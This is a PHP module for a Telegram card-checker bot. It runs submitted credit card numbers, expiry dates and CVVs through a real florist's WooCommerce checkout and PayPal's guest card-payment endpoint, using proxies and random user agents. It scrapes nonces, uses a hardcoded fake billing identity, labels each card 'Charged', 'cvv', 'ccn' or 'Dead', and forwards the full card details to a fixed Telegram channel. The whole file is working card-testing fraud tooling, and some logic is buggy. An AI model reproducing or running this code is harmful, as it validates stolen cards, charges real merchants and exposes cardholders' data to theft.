<?php

include('rnd-ua.php');

$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$proxy = "🇺🇸 - Live!";
$gate = "𝙋𝙖𝙮𝙋𝙖𝙡";
$charged = "$1";
$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/pp1', '/Pp1', '/pP1', '/PP1', '!pp1', '!Pp1', '!pP1', '!PP1', '.pp1', '.Pp1', '.pP1', '.PP1'])){
$eMsg = explode(' ', $msg['text']);
$cEMsg = count($eMsg);
$cBin = cBin($eMsg[1]);

$antiSpam = TRUE;
include('accs-as.php');

if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/pp cc|month|year|cvc</code>",
'reply_to_message_id' => $msg['message_id']
]);
}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

include('cc-analyzer.php');

if($cc == false || $month == false || $year == false || $cvv == false){
include('cc-errors.php');
}
else{
start:
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>⚪️</code>"
]);
/*=====  url  ======*/
$site = "https://floristeriabonsai.net/producto/producto-de-prueba/";
$url = explode("/", $site)[2];
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: '.$url.'',
'user-agent: '.$rnd_ua.'',
'content-type:multipart/form-data; boundary=----WebKitFormBoundaryEQncKg0ZTUKHfkTF',
'origin: https://'.$url.'',
'referer: '.$site.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryEQncKg0ZTUKHfkTF
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryEQncKg0ZTUKHfkTF
Content-Disposition: form-data; name="add-to-cart"

81659
------WebKitFormBoundaryEQncKg0ZTUKHfkTF--
');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r1 = curl_exec($ch);

/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$url/finalizar-compra/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: '.$url.'',
'user-agent: '.$rnd_ua.'',
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r2 = curl_exec($ch);
$cnonce = capturehtml($r2, 'ppc-create-order","nonce":"','"');
$pnonce = capturehtml($r2, '"woocommerce-process-checkout-nonce" value="','"');
if(empty($cnonce)){
$retry++;
goto start;
}
if(empty($pnonce)){
$retry++;
goto start;
}
/*=====  3REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://$url/?wc-ajax=ppc-create-order");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: '.$url.'',
'user-agent: '.$rnd_ua.'',
'origin: https://'.$url.''
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nonce":"'.$cnonce.'","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form":{"billing_first_name":"Sachio","billing_last_name":"YT","billing_company":"YT","billing_country":"US","billing_address_1":"118 W 132nd St","billing_address_2":"Apartamento, habitación, etc. (opcional)","billing_city":"New York","billing_postcode":"10027","billing_phone":"19006318646","billing_email":"sachiopremiun@gmail.com","account_password":"","shipping_first_name":"","shipping_last_name":"","shipping_company":"","shipping_country":"DO","shipping_address_1":"Número de la casa y nombre de la calle","shipping_address_2":"Apartamento, habitación, etc. (opcional)","shipping_city":"","shipping_postcode":"","shipping_user_name":"","shipping_phone":"","shipping_user_from":"","shipping_user_date":"","shipping_user_message":"","order_comments":"","payment_method":"ppcp-card-button-gateway","terms":"on","terms-field":"1","woocommerce-process-checkout-nonce":"'.$pnonce.'","_wp_http_referer":"/?wc-ajax=update_order_review","ppcp-funding-source":"card"},"createaccount":false}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r3 = curl_exec($ch);
$id = capture($r3, '"id":"','"');
if(empty($id)){
$retry++;
goto start;
}
/*=====  4REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/graphql?fetch_credit_form_submit");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.paypal.com',
'paypal-client-metadata-id:'.$id.'',
'paypal-client-context:'.$id.'',
'user-agent: '.$rnd_ua.'',
'origin: https://www.paypal.com',
'x-app-name: standardcardfields',
'x-country: US',
'content-type: application/json'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$month.'/'.$year.'","postalCode":"10027","securityCode":"'.$cvv.'"},"phoneNumber":"19006318646","firstName":"Sachio","lastName":"YT","billingAddress":{"givenName":"Sachio","familyName":"YT","line1":"118 W 132nd St","line2":"Apartamento, habitación, etc. (opcional)","city":"New York","state":"NY","postalCode":"10027","country":"US"},"email":"sachiopremiun@gmail.com","currencyConversionType":"PAYPAL"},"operationName":null}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r4 = curl_exec($ch);
$code = trim(strip_tags(capture($r4, '"code":"','"')));
$msg2 = trim(strip_tags(capture($r4, '"message":"','"')));
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";
curl_close($ch);

$i3d = trim(strip_tags(capture($r4, '"is3DSecureRequired":','}')));

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>✨</code>"
]);

if(strpos($r5, 'is3DSecureRequired')){
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» Charged!</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>approveGuestPaymentWithCreditCard -» ".$charged."</code>
学 𝙑𝙗𝙫 -» <code>".$i3d."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
output('sendMessage', [
'chat_id' => -1001701219924,
'message_id' => $msgId_bot,
'text' => "零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» Charged!</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>approveGuestPaymentWithCreditCard -» ".$charged."</code>
学 𝙑𝙗𝙫 -» <code>".$i3d."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
elseif($code == "INVALID_BILLING_ADDRESS"){
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» cvv</code>
学 𝘾𝙤𝙙𝙚 -» <code>INVALID_BILLING_ADDRESS</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
output('sendMessage', [
'chat_id' => -1001701219924,
'message_id' => $msgId_bot,
'text' => "零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» cvv</code>
学 𝘾𝙤𝙙𝙚 -» <code>INVALID_BILLING_ADDRESS</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
elseif($code == "INVALID_SECURITY_CODE"){
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» ccn</code>
学 𝘾𝙤𝙙𝙚 -» <code>INVALID_SECURITY_CODE</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
output('sendMessage', [
'chat_id' => -1001701219924,
'message_id' => $msgId_bot,
'text' => "零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Approved! ✅ -» ccn</code>
学 𝘾𝙤𝙙𝙚 -» <code>INVALID_SECURITY_CODE</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
else{
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Dead! ❌</code>
学 𝘾𝙤𝙙𝙚 -» <code>".$code."</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
if($retry > 2){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);